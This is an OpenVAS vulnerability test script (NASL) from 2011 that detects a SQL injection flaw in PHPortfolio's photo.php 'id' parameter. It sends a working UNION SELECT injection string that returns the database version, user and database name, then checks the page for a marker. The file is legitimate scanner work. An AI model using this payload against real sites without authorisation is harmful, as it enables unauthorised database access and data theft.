###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_phportfolio_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# PHPortfolio 'photo.php' SQL Injection Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to cause SQL Injection attack
  and gain sensitive information.
  Impact Level: Application";
tag_affected = "PHPortfolio version 1.3 and prior.";
tag_insight = "The flaw is caused by improper validation of user-supplied input via the
  'id' parameter in photo.php, which allows attacker to manipulate SQL queries
  by injecting arbitrary SQL code.";
tag_solution = "No solution or patch is available as of 24th May, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.outshine.com/software/phportfolio/intro.php";
tag_summary = "This host is running PHPortfolio and is prone to SQL injection
  vulnerability.";

if(description)
{
  script_id(902521);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
  script_cve_id("CVE-2008-4348");
  script_bugtraq_id(31143);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("PHPortfolio 'photo.php' SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/45078");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17316/");

  script_description(desc);
  script_summary("Check if PHPortfolio is vulnerable to SQL Injection attacks");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!get_port_state(port)) {
  exit(0);
}

## Chek Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

foreach dir (make_list("phportfolio", "/", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/index.php"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application
  if(egrep(pattern:"Powered by.*>PHPortfolio<", string:res))
  {
    ## Construct attack request
    url = string(dir, "/photo.php?id=48+and+1=2+union+select+1,version(),",
                 "user(),database(),0x4f70656e5641532053514c54657374,6--");

    ## Confirm exploit worked by checking the response
    if(http_vuln_check(port:port, url:url, pattern:'>OpenVAS SQLTest<',
       extra_check: make_list('>film:<', '>lens:<', '>location:<')))
    {
      security_hole(port);
      exit(0);
    }
  }
}
